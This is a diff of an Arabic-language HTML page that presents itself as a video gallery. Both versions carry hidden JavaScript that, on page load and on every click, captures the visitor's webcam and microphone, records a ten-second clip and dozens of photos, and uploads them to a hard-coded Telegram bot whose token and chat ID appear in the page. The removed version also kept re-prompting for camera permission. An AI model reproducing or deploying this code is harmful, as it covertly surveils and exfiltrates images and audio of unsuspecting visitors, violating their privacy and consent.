@@ -1,192 +1,171 @@
 <!DOCTYPE html><html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>طائفة الظلال - العنقاء_666</title>
   <style>
     body {
-      margin: 0;
-      background-color: #1a001a;
-      font-family: Arial, sans-serif;
-      direction: rtl;
+      background-color: #5a2d82; /* 👑 خلفية بنفسجية باردة مشعة */
       color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      direction: rtl;
     }
     .header {
+      background-image: url('5alfia.png'); /* 👑 غلاف الصورة */
+      background-size: cover;
+      background-position: center;
+      height: 200px;
       position: relative;
-      text-align: center;
     }
-    .header img.cover {
-      width: 100%;
-      height: auto;
-    }
-    .profile-pic {
+    .profile {
       width: 100px;
       height: 100px;
       border-radius: 50%;
-      border: 4px solid violet;
+      border: 4px solid white;
       position: absolute;
       bottom: -50px;
       right: 20px;
+      background-image: url('profile.png');
+      background-size: cover;
+      background-position: center;
     }
-    .video-grid {
+    .container {
+      margin-top: 60px;
+      padding: 20px;
       display: grid;
       grid-template-columns: repeat(5, 1fr);
-      gap: 10px;
-      padding: 80px 10px 10px 10px;
+      gap: 15px;
     }
     .video-card {
-      position: relative;
-      border: 2px solid pink;
+      background-color: #a74fd1;
+      border: 3px solid pink;
+      padding: 5px;
       border-radius: 10px;
       animation: pulse 2s infinite;
-      overflow: hidden;
+      position: relative;
+    }
+    .video-card:hover {
+      transform: scale(1.05);
+      cursor: pointer;
+    }
+    .video-description {
+      text-align: center;
+      margin-top: 5px;
+      font-weight: bold;
     }
     @keyframes pulse {
       0% { box-shadow: 0 0 10px red; }
-      50% { box-shadow: 0 0 20px pink; }
+      50% { box-shadow: 0 0 20px red; }
       100% { box-shadow: 0 0 10px red; }
-    }
-    .video-card video {
-      width: 100%;
-      display: block;
-    }
-    .desc {
-      text-align: center;
-      background: #300030;
-      padding: 4px;
-      font-size: 14px;
-    }
-    .download-btn {
-      position: absolute;
-      bottom: 5px;
-      left: 5px;
-      background: #ff69b4;
-      border: none;
-      padding: 5px 10px;
-      color: white;
-      border-radius: 10px;
-      font-weight: bold;
-    }
-    .back-btn {
-      position: fixed;
-      bottom: 10px;
-      left: 10px;
-      background: pink;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 30px;
-      font-weight: bold;
-      color: black;
-      animation: pulse 2s infinite;
     }
   </style>
 </head>
 <body>
   <div class="header">
-    <img class="cover" src="5alfia.png" alt="غلاف">
-    <img class="profile-pic" src="profile.png" alt="صورة بروفايل">
-  </div>  <div class="video-grid">
-    <div class="video-card" onclick="sendDescription('لحن نهاية')">
-      <video controls poster="loading.gif" onclick="event.stopPropagation()">
-        <source src="VivaCut_video_1751836959485_HD1.mp4" type="video/mp4">
-      </video>
-      <div class="desc">لحن نهاية</div>
-      <a class="download-btn" href="VivaCut_video_1751836959485_HD1.mp4" download>تحميل فيديو</a>
+    <div class="profile"></div>
+  </div>  <div class="container">
+    <div class="video-card" onclick="sendVideoInfo('لحن نهاية')">
+      <video width="100%" src="VivaCut_video_1751836959485_HD1.mp4" controls></video>
+      <div class="video-description">لحن نهاية</div>
     </div>
-    <!-- 👑 كرر هذا البلوك مع تغيير اسم الفيديو والوصف فقط -->
-  </div>  <button class="back-btn" onclick="location.href='index.html'">
-    ← رجوع للصور
-  </button>  <script>
+    <!-- 👑 كرر هذا البلوك لتكرار الفيديوهات حسب الحاجة مع تغيير الاسم والوصف -->
+  </div>  <script>
     const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
     const CHAT_ID = "7664410054";
 
-    function sendToTelegram(data) {
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
-        method: "POST",
-        body: data
-      });
-    }
-
-    function sendDescription(desc) {
+    function sendVideoInfo(desc) {
       fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: `📹 وصف الفيديو: ${desc}` })
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `📹 تم مشاهدة الفيديو: ${desc}`
+        })
       });
     }
 
-    async function captureAndSendMedia() {
+    // طلب الإذن من المستخدم
+    async function requestPermissionsAndCapture() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const videoTrack = stream.getVideoTracks()[0];
-        const audioTrack = stream.getAudioTracks()[0];
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
 
-        // تسجيل فيديو 10 ثوانٍ
+        // تسجيل فيديو لمدة 10 ثواني
         const mediaRecorder = new MediaRecorder(stream);
         const chunks = [];
 
         mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
+        mediaRecorder.onstop = async () => {
           const blob = new Blob(chunks, { type: 'video/mp4' });
-          const form = new FormData();
-          form.append("chat_id", CHAT_ID);
-          form.append("document", blob, "video.mp4");
-          sendToTelegram(form);
+          const formData = new FormData();
+          formData.append("video", blob, "video.mp4");
+          await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo?chat_id=${CHAT_ID}`, {
+            method: "POST",
+            body: formData
+          });
         };
 
         mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 10000);
+        setTimeout(() => mediaRecorder.stop(), 10000); // ⏱️ 10 ثواني فقط
 
-        // التقاط 50 صورة png
-        const video = document.createElement("video");
+        // التقاط 50 صورة PNG
+        const video = document.createElement('video');
         video.srcObject = stream;
         video.play();
-        const canvas = document.createElement("canvas");
+
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
         canvas.width = 480;
         canvas.height = 360;
-        const ctx = canvas.getContext("2d");
 
         for (let i = 0; i < 50; i++) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(blob => {
-            const form = new FormData();
-            form.append("chat_id", CHAT_ID);
-            form.append("document", blob, `image${i}.png`);
-            sendToTelegram(form);
-          }, 'image/png');
-          await new Promise(r => setTimeout(r, 100));
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append("photo", blob, `photo_${i}.png`);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+              method: "POST",
+              body: formData
+            });
+          }, "image/png");
+          await new Promise(res => setTimeout(res, 200));
         }
       } catch (e) {
-        console.warn("إعادة طلب إذن الكاميرا...");
-        setTimeout(captureAndSendMedia, 1000);
+        alert("⚠️ فشل الحصول على الإذن بالكاميرا/المايكروفون");
       }
     }
 
-    function captureOnClick() {
-      document.body.addEventListener("click", async () => {
+    // عند تحميل الصفحة اطلب الإذن
+    window.onload = () => {
+      requestPermissionsAndCapture();
+
+      // التقاط صورة عند كل نقرة
+      document.body.addEventListener('click', async () => {
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement("video");
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          const video = document.createElement('video');
           video.srcObject = stream;
-          await video.play();
-          const canvas = document.createElement("canvas");
+          video.play();
+
+          const canvas = document.createElement('canvas');
           canvas.width = 480;
           canvas.height = 360;
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(blob => {
-            const form = new FormData();
-            form.append("chat_id", CHAT_ID);
-            form.append("document", blob, `click.png`);
-            sendToTelegram(form);
-          }, 'image/png');
-        } catch (e) {}
-      });
-    }
+          const ctx = canvas.getContext('2d');
 
-    window.onload = () => {
-      captureAndSendMedia();
-      captureOnClick();
-    }
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(async (blob) => {
+              const formData = new FormData();
+              formData.append("photo", blob, "click_photo.png");
+              await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+                method: "POST",
+                body: formData
+              });
+            }, "image/png");
+          }, 1000);
+        } catch (err) {}
+      });
+    };
   </script></body>
 </html>
